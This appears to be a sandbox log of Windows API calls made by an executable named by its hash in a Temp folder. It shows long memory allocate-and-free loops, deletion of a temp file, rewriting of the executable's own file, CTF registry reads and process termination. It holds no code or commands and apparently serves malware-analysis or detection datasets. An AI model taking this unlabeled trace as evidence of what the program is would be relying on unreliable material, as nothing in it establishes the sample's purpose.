NtFreeVirtualMemory,0xffffffff#2027520#32768#3368#0x02540000,0,1542888173.40675
NtAllocateVirtualMemory,0#0#0xffffffff#0x02540000#4096#4#0#2035712#3368,0,1542888173.40675
NtFreeVirtualMemory,0xffffffff#2031616#32768#3368#0x02350000,0,1542888173.40675
NtAllocateVirtualMemory,0#0#0xffffffff#0x02740000#4096#4#0#2039808#3368,0,1542888173.40675
NtFreeVirtualMemory,0xffffffff#2035712#32768#3368#0x02540000,0,1542888173.40675
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#2043904#3368,0,1542888173.42175
NtFreeVirtualMemory,0xffffffff#2039808#32768#3368#0x02740000,0,1542888173.42175
NtAllocateVirtualMemory,0#0#0xffffffff#0x02550000#4096#4#0#2048000#3368,0,1542888173.42175
NtFreeVirtualMemory,0xffffffff#2043904#32768#3368#0x02350000,0,1542888173.42175
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#2052096#3368,0,1542888173.42175
NtFreeVirtualMemory,0xffffffff#2048000#32768#3368#0x02550000,0,1542888173.42175
NtAllocateVirtualMemory,0#0#0xffffffff#0x02550000#4096#4#0#2056192#3368,0,1542888173.42175
NtFreeVirtualMemory,0xffffffff#2052096#32768#3368#0x02350000,0,1542888173.42175
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#2060288#3368,0,1542888173.42175
NtFreeVirtualMemory,0xffffffff#2056192#32768#3368#0x02550000,0,1542888173.42175
NtAllocateVirtualMemory,0#0#0xffffffff#0x02550000#4096#4#0#2064384#3368,0,1542888173.42175
NtFreeVirtualMemory,0xffffffff#2060288#32768#3368#0x02350000,0,1542888173.42175
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#2068480#3368,0,1542888173.42175
NtFreeVirtualMemory,0xffffffff#2064384#32768#3368#0x02550000,0,1542888173.42175
NtAllocateVirtualMemory,0#0#0xffffffff#0x02550000#4096#4#0#2072576#3368,0,1542888173.42175
NtFreeVirtualMemory,0xffffffff#2068480#32768#3368#0x02350000,0,1542888173.42175
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#2076672#3368,0,1542888173.42175
NtFreeVirtualMemory,0xffffffff#2072576#32768#3368#0x02550000,0,1542888173.42175
NtAllocateVirtualMemory,0#0#0xffffffff#0x02550000#4096#4#0#2080768#3368,0,1542888173.42175
NtFreeVirtualMemory,0xffffffff#2076672#32768#3368#0x02350000,0,1542888173.42175
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#2084864#3368,0,1542888173.42175
NtFreeVirtualMemory,0xffffffff#2080768#32768#3368#0x02550000,0,1542888173.42175
NtAllocateVirtualMemory,0#0#0xffffffff#0x02550000#4096#4#0#2088960#3368,0,1542888173.42175
NtFreeVirtualMemory,0xffffffff#2084864#32768#3368#0x02350000,0,1542888173.42175
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#2093056#3368,0,1542888173.42175
NtFreeVirtualMemory,0xffffffff#2088960#32768#3368#0x02550000,0,1542888173.42175
NtAllocateVirtualMemory,0#0#0xffffffff#0x02550000#4096#4#0#2097152#3368,0,1542888173.42175
NtFreeVirtualMemory,0xffffffff#2093056#32768#3368#0x02350000,0,1542888173.42175
NtAllocateVirtualMemory,0#0#0xffffffff#0x02750000#4096#4#0#2101248#3368,0,1542888173.42175
NtFreeVirtualMemory,0xffffffff#2097152#32768#3368#0x02550000,0,1542888173.42175
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#2113536#3368,0,1542888173.42175
NtFreeVirtualMemory,0xffffffff#2101248#32768#3368#0x02750000,0,1542888173.43775
NtAllocateVirtualMemory,0#0#0xffffffff#0x02560000#4096#4#0#2121728#3368,0,1542888173.43775
NtFreeVirtualMemory,0xffffffff#2113536#32768#3368#0x02350000,0,1542888173.43775
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#2125824#3368,0,1542888173.43775
NtFreeVirtualMemory,0xffffffff#2121728#32768#3368#0x02560000,0,1542888173.43775
NtAllocateVirtualMemory,0#0#0xffffffff#0x02560000#4096#4#0#2129920#3368,0,1542888173.43775
NtFreeVirtualMemory,0xffffffff#2125824#32768#3368#0x02350000,0,1542888173.43775
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#2134016#3368,0,1542888173.43775
NtFreeVirtualMemory,0xffffffff#2129920#32768#3368#0x02560000,0,1542888173.43775
NtAllocateVirtualMemory,0#0#0xffffffff#0x02560000#4096#4#0#2146304#3368,0,1542888173.43775
NtFreeVirtualMemory,0xffffffff#2134016#32768#3368#0x02350000,0,1542888173.43775
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#2158592#3368,0,1542888173.43775
NtFreeVirtualMemory,0xffffffff#2146304#32768#3368#0x02560000,0,1542888173.43775
NtAllocateVirtualMemory,0#0#0xffffffff#0x02560000#4096#4#0#2162688#3368,0,1542888173.43775
NtFreeVirtualMemory,0xffffffff#2158592#32768#3368#0x02350000,0,1542888173.43775
NtAllocateVirtualMemory,0#0#0xffffffff#0x02770000#4096#4#0#2166784#3368,0,1542888173.43775
NtFreeVirtualMemory,0xffffffff#2162688#32768#3368#0x02560000,0,1542888173.43775
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#2174976#3368,0,1542888173.43775
NtFreeVirtualMemory,0xffffffff#2166784#32768#3368#0x02770000,0,1542888173.43775
NtAllocateVirtualMemory,0#0#0xffffffff#0x02570000#4096#4#0#2179072#3368,0,1542888173.43775
NtFreeVirtualMemory,0xffffffff#2174976#32768#3368#0x02350000,0,1542888173.43775
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#2183168#3368,0,1542888173.43775
NtFreeVirtualMemory,0xffffffff#2179072#32768#3368#0x02570000,0,1542888173.43775
NtAllocateVirtualMemory,0#0#0xffffffff#0x02570000#4096#4#0#2195456#3368,0,1542888173.43775
NtFreeVirtualMemory,0xffffffff#2183168#32768#3368#0x02350000,0,1542888173.43775
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#2203648#3368,0,1542888173.43775
NtFreeVirtualMemory,0xffffffff#2195456#32768#3368#0x02570000,0,1542888173.43775
NtAllocateVirtualMemory,0#0#0xffffffff#0x02570000#4096#4#0#2207744#3368,0,1542888173.43775
NtFreeVirtualMemory,0xffffffff#2203648#32768#3368#0x02350000,0,1542888173.43775
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#2211840#3368,0,1542888173.45375
NtFreeVirtualMemory,0xffffffff#2207744#32768#3368#0x02570000,0,1542888173.45375
NtAllocateVirtualMemory,0#0#0xffffffff#0x02570000#4096#4#0#2220032#3368,0,1542888173.45375
NtFreeVirtualMemory,0xffffffff#2211840#32768#3368#0x02350000,0,1542888173.45375
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#2228224#3368,0,1542888173.45375
NtFreeVirtualMemory,0xffffffff#2220032#32768#3368#0x02570000,0,1542888173.45375
NtAllocateVirtualMemory,0#0#0xffffffff#0x02570000#4096#4#0#2236416#3368,0,1542888173.45375
NtFreeVirtualMemory,0xffffffff#2228224#32768#3368#0x02350000,0,1542888173.45375
NtAllocateVirtualMemory,0#0#0xffffffff#0x027a0000#4096#4#0#2240512#3368,0,1542888173.45375
NtFreeVirtualMemory,0xffffffff#2236416#32768#3368#0x02570000,0,1542888173.45375
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#2244608#3368,0,1542888173.45375
NtFreeVirtualMemory,0xffffffff#2240512#32768#3368#0x027a0000,0,1542888173.45375
NtAllocateVirtualMemory,0#0#0xffffffff#0x02580000#4096#4#0#2252800#3368,0,1542888173.45375
NtFreeVirtualMemory,0xffffffff#2244608#32768#3368#0x02350000,0,1542888173.45375
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#2256896#3368,0,1542888173.45375
NtFreeVirtualMemory,0xffffffff#2252800#32768#3368#0x02580000,0,1542888173.45375
NtAllocateVirtualMemory,0#0#0xffffffff#0x02580000#4096#4#0#2273280#3368,0,1542888173.45375
NtFreeVirtualMemory,0xffffffff#2256896#32768#3368#0x02350000,0,1542888173.45375
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#2277376#3368,0,1542888173.45375
NtFreeVirtualMemory,0xffffffff#2273280#32768#3368#0x02580000,0,1542888173.46875
NtAllocateVirtualMemory,0#0#0xffffffff#0x02580000#4096#4#0#2281472#3368,0,1542888173.46875
NtFreeVirtualMemory,0xffffffff#2277376#32768#3368#0x02350000,0,1542888173.46875
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#2285568#3368,0,1542888173.46875
NtFreeVirtualMemory,0xffffffff#2281472#32768#3368#0x02580000,0,1542888173.46875
NtAllocateVirtualMemory,0#0#0xffffffff#0x02580000#4096#4#0#2289664#3368,0,1542888173.46875
NtFreeVirtualMemory,0xffffffff#2285568#32768#3368#0x02350000,0,1542888173.46875
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#2293760#3368,0,1542888173.46875
NtFreeVirtualMemory,0xffffffff#2289664#32768#3368#0x02580000,0,1542888173.46875
NtAllocateVirtualMemory,0#0#0xffffffff#0x02580000#4096#4#0#2297856#3368,0,1542888173.46875
NtFreeVirtualMemory,0xffffffff#2293760#32768#3368#0x02350000,0,1542888173.46875
NtAllocateVirtualMemory,0#0#0xffffffff#0x027c0000#4096#4#0#2301952#3368,0,1542888173.46875
NtFreeVirtualMemory,0xffffffff#2297856#32768#3368#0x02580000,0,1542888173.46875
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#2306048#3368,0,1542888173.46875
NtFreeVirtualMemory,0xffffffff#2301952#32768#3368#0x027c0000,0,1542888173.46875
NtAllocateVirtualMemory,0#0#0xffffffff#0x02590000#4096#4#0#2310144#3368,0,1542888173.46875
NtFreeVirtualMemory,0xffffffff#2306048#32768#3368#0x02350000,0,1542888173.46875
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#2314240#3368,0,1542888173.46875
NtFreeVirtualMemory,0xffffffff#2310144#32768#3368#0x02590000,0,1542888173.46875
NtAllocateVirtualMemory,0#0#0xffffffff#0x02590000#4096#4#0#2318336#3368,0,1542888173.46875
NtFreeVirtualMemory,0xffffffff#2314240#32768#3368#0x02350000,0,1542888173.46875
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#2318336#3368,0,1542888173.46875
NtFreeVirtualMemory,0xffffffff#2318336#32768#3368#0x02590000,0,1542888173.46875
NtFreeVirtualMemory,0xffffffff#2318336#32768#3368#0x01c40000,0,1542888173.48475
DeleteFileW,C:\Users\mag\AppData\Local\Temp\[7844c51bad232859450ed87d2931a993]#C:\Users\mag\AppData\Local\Temp\[7844c51bad232859450ed87d2931a993],0,1542888173.48475
NtOpenFile,0x000000e0#2113568#1#0x00110080#C:\Users\mag\AppData\Local\Temp\09660436d3a71a3e5eac43a562527e9e84960cccada70a3e6789dd526447bff7.exe#7#\??\C:\Users\mag\AppData\Local\Temp\09660436d3a71a3e5eac43a562527e9e84960cccada70a3e6789dd526447bff7.exe,0,1542888173.48475
NtQueryInformationFile,0x000000e0#35,0,1542888173.48475
NtSetInformationFile,0x000000e0#10,0,1542888173.48475
NtClose,0x000000e0,0,1542888173.48475
NtOpenFile,0x000000e0#16417#1#0x00100000#C:\#0#\??\C:\,0,1542888173.48475
NtQueryInformationFile,0x000000e0#9,0,1542888173.48475
NtClose,0x000000e0,0,1542888173.48475
NtCreateFile,0x000000e0#96#2#0x40100080#C:\Users\mag\AppData\Local\Temp\09660436d3a71a3e5eac43a562527e9e84960cccada70a3e6789dd526447bff7.exe#\??\C:\Users\mag\AppData\Local\Temp\09660436d3a71a3e5eac43a562527e9e84960cccada70a3e6789dd526447bff7.exe#128#5#0,0,1542888173.48475
NtClose,0x000000e0,0,1542888173.48475
NtFreeVirtualMemory,0xffffffff#2318336#32768#3368#0x02350000,0,1542888174.49975
GetSystemMetrics,31,21,1542888174.49975
GetSystemMetrics,31,21,1542888174.49975
GetSystemMetrics,31,21,1542888174.49975
GetSystemMetrics,31,21,1542888174.49975
GetSystemMetrics,31,21,1542888174.49975
GetSystemMetrics,31,21,1542888174.49975
GetSystemMetrics,50,16,1542888174.49975
GetSystemMetrics,12,32,1542888174.49975
GetSystemMetrics,31,21,1542888174.49975
GetSystemMetrics,31,21,1542888174.49975
NtClose,0x000000e0,0,1542888174.49975
NtClose,0x00000158,0,1542888174.49975
RegOpenKeyExW,0x80000002#HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\CTF\Compatibility\09660436d3a71a3e5eac43a562527e9e84960cccada70a3e6789dd526447bff7.exe#0x00000000#SOFTWARE\Microsoft\CTF\Compatibility\09660436d3a71a3e5eac43a562527e9e84960cccada70a3e6789dd526447bff7.exe#0x00020019#0,2,1542888174.49975
GetSystemDirectoryW,C:\Windows\system32,19,1542888174.49975
LdrLoadDll,0#0#0x76540000#ole32#C:\Windows\system32\ole32.dll,0,1542888174.49975
LdrGetProcedureAddress,CoInitializeEx#0#ole32#0x765809ad#0x76540000,0,1542888174.49975
LdrGetProcedureAddress,CoUninitialize#0#ole32#0x765886d3#0x76540000,0,1542888174.49975
CoInitializeEx,2,1,1542888174.49975
LdrGetProcedureAddress,CoRegisterInitializeSpy#0#ole32#0x76587660#0x76540000,0,1542888174.49975
LdrGetProcedureAddress,CoRevokeInitializeSpy#0#ole32#0x76589784#0x76540000,0,1542888174.49975
NtClose,0x00000158,0,1542888174.49975
NtClose,0x000000e0,0,1542888174.49975
RegOpenKeyExW,0x80000002#HKEY_LOCAL_MACHINE\Software\Microsoft\CTF\TIP\{0000897b-83df-4b96-be07-0fb58b01c4a4}\LanguageProfile\0x00000000\{0001bea3-ed56-483d-a2e2-aeae25577436}#0x000000e0#Software\Microsoft\CTF\TIP\{0000897b-83df-4b96-be07-0fb58b01c4a4}\LanguageProfile\0x00000000\{0001bea3-ed56-483d-a2e2-aeae25577436}#0x00020019#0,0,1542888174.49975
RegQueryValueExW,0x000000e0#Enable#HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\CTF\TIP\{0000897b-83df-4b96-be07-0fb58b01c4a4}\LanguageProfile\0x00000000\{0001bea3-ed56-483d-a2e2-aeae25577436}\Enable#1#4,0,1542888174.49975
RegCloseKey,0x000000e0,0,1542888174.49975
NtClose,0x000000e0,0,1542888174.49975
NtClose,0x00000158,0,1542888174.49975
NtClose,0x00000158,0,1542888174.49975
NtClose,0x000000e0,0,1542888174.49975
NtClose,0x000000e0,0,1542888174.49975
NtClose,0x000000e0,0,1542888174.49975
GetSystemMetrics,8192,0,1542888174.49975
NtOpenMutant,CicLoadWinStaWinSta0#0x000000e0#0x00100000,0,1542888174.49975
NtClose,0x000000e0,0,1542888174.51575
NtOpenMutant,Local\MSCTF.CtfMonitorInstMutexDefault1#0x000000e0#0x00100000,0,1542888174.51575
NtClose,0x000000e0,0,1542888174.51575
RegOpenKeyExW,0x80000002#HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\CTF\#0x000000e0#SOFTWARE\Microsoft\CTF\#0x00020019#0,0,1542888174.51575
RegQueryValueExW,0x000000e0#EnableAnchorContext#HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\CTF\EnableAnchorContext##0,2,1542888174.51575
RegCloseKey,0x000000e0,0,1542888174.51575
RegOpenKeyExW,0x80000002#HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\CTF\KnownClasses#0x00000000#SOFTWARE\Microsoft\CTF\KnownClasses#0x00020019#0,2,1542888174.51575
LdrGetDllHandle,0#0x77960000#USER32,0,1542888174.51575
FindResourceExW,#32512#0x77960000#0##14,0,1542888174.51575
FindResourceExW,#32512#0x77960000#0##22,0,1542888174.51575
GetSystemMetrics,31,21,1542888174.51575
GetSystemMetrics,31,21,1542888174.51575
GetSystemMetrics,31,21,1542888174.51575
GetSystemMetrics,31,21,1542888174.51575
GetSystemMetrics,31,21,1542888174.51575
GetSystemMetrics,31,21,1542888174.51575
GetSystemMetrics,50,16,1542888174.51575
GetSystemMetrics,12,32,1542888174.51575
GetSystemMetrics,31,21,1542888174.51575
GetSystemMetrics,31,21,1542888174.51575
GetSystemMetrics,31,21,1542888174.51575
GetSystemMetrics,31,21,1542888174.51575
GetSystemMetrics,31,21,1542888174.51575
GetSystemMetrics,31,21,1542888174.51575
GetSystemMetrics,31,21,1542888174.51575
GetSystemMetrics,31,21,1542888174.51575
GetSystemMetrics,50,16,1542888174.51575
GetSystemMetrics,12,32,1542888174.51575
GetSystemMetrics,31,21,1542888174.51575
GetSystemMetrics,31,21,1542888174.51575
GetSystemMetrics,31,21,1542888174.51575
GetSystemMetrics,31,21,1542888174.51575
GetSystemMetrics,31,21,1542888174.51575
GetSystemMetrics,31,21,1542888174.51575
GetSystemMetrics,31,21,1542888174.51575
GetSystemMetrics,31,21,1542888174.51575
GetSystemMetrics,50,16,1542888174.51575
GetSystemMetrics,12,32,1542888174.51575
GetSystemMetrics,31,21,1542888174.51575
GetSystemMetrics,31,21,1542888174.51575
NtClose,0x000000dc,0,1542888174.51575
LdrUnloadDll,kernel32#0x760b0000,0,1542888174.51575
LdrUnloadDll,kernel32#0x760b0000,0,1542888174.51575
LdrUnloadDll,kernel32#0x760b0000,0,1542888174.51575
LdrUnloadDll,kernel32#0x760b0000,0,1542888174.51575
LdrUnloadDll,kernel32#0x760b0000,0,1542888174.51575
LdrUnloadDll,kernel32#0x760b0000,0,1542888174.51575
LdrUnloadDll,kernel32#0x760b0000,0,1542888174.51575
LdrUnloadDll,ADVAPI32#0x77730000,0,1542888174.51575
LdrUnloadDll,ADVAPI32#0x77730000,0,1542888174.51575
LdrUnloadDll,ADVAPI32#0x77730000,0,1542888174.51575
LdrUnloadDll,kernel32#0x760b0000,0,1542888174.51575
LdrUnloadDll,kernel32#0x760b0000,0,1542888174.51575
LdrUnloadDll,kernel32#0x760b0000,0,1542888174.51575
LdrUnloadDll,kernel32#0x760b0000,0,1542888174.51575
LdrUnloadDll,kernel32#0x760b0000,0,1542888174.53175
LdrUnloadDll,ADVAPI32#0x77730000,0,1542888174.53175
LdrUnloadDll,ADVAPI32#0x77730000,0,1542888174.53175
LdrUnloadDll,ADVAPI32#0x77730000,0,1542888174.53175
LdrUnloadDll,ADVAPI32#0x77730000,0,1542888174.53175
LdrUnloadDll,ADVAPI32#0x77730000,0,1542888174.53175
LdrUnloadDll,ADVAPI32#0x77730000,0,1542888174.53175
LdrUnloadDll,USER32#0x77960000,0,1542888174.53175
CoUninitialize,,0,1542888174.53175
CoUninitialize,,0,1542888174.53175
UnhookWindowsHookEx,0x003f0181,1,1542888174.53175
UnhookWindowsHookEx,0x00440209,1,1542888174.53175
NtClose,0x000000bc,0,1542888174.53175
SetUnhandledExceptionFilter,,4630615,1542888174.53175
NtTerminateProcess,0x00000000#0x00000000#0,0,1542888174.54675
NtTerminateProcess,0x00000000#0x00000000#0,0,1542888174.54675
NtClose,0x00000148,0,1542888174.54675
NtClose,0x00000140,0,1542888174.54675
NtClose,0x00000144,0,1542888174.54675
NtClose,0x0000013c,0,1542888174.54675
NtClose,0x00000134,0,1542888174.54675
NtClose,0x00000130,0,1542888174.54675
NtClose,0x0000014c,0,1542888174.54675
NtClose,0x000000c4,0,1542888174.54675
NtClose,0x000000c0,0,1542888174.54675
NtClose,0x0000001c,0,1542888174.54675
NtClose,0x000000a0,0,1542888174.54675
NtClose,0x0000009c,0,1542888174.54675
NtClose,0x00000098,0,1542888174.54675
NtClose,0x00000094,0,1542888174.54675
NtUnmapViewOfSection,0xffffffff#8192#3368#0x00220000,0,1542888174.54675
NtClose,0x00000090,0,1542888174.56275
NtClose,0x0000008c,0,1542888174.56275
NtClose,0x0000006c,0,1542888174.56275
NtClose,0x00000064,0,1542888174.56275
NtClose,0x00000058,0,1542888174.56275
NtClose,0x0000005c,0,1542888174.56275
NtClose,0x00000060,0,1542888174.56275
NtClose,0x00000068,0,1542888174.56275
NtClose,0x00000054,0,1542888174.56275
NtClose,0x00000050,0,1542888174.56275
NtClose,0x00000048,0,1542888174.56275
NtClose,0x000000f4,0,1542888174.56275
NtFreeVirtualMemory,0xffffffff#65536#32768#3368#0x01610000,0,1542888174.56275
NtClose,0x00000040,0,1542888174.56275
NtClose,0x00000044,0,1542888174.56275
NtClose,0x0000003c,0,1542888174.56275
NtClose,0x00000038,0,1542888174.56275
NtClose,0x00000034,0,1542888174.56275
LdrUnloadDll,IMM32#0x777d0000,0,1542888174.56275
NtOpenKey,0x00000034#HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\GRE_Initialize#0x00020019,0,1542888174.56275
NtQueryValueKey,HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\GRE_Initialize\DisableMetaFiles##0##0x00000034#2,3221225524,1542888174.57875
NtClose,0x00000034,0,1542888174.57875
NtTerminateProcess,0xffffffff#0x00000000#3368,0,1542888174.57875
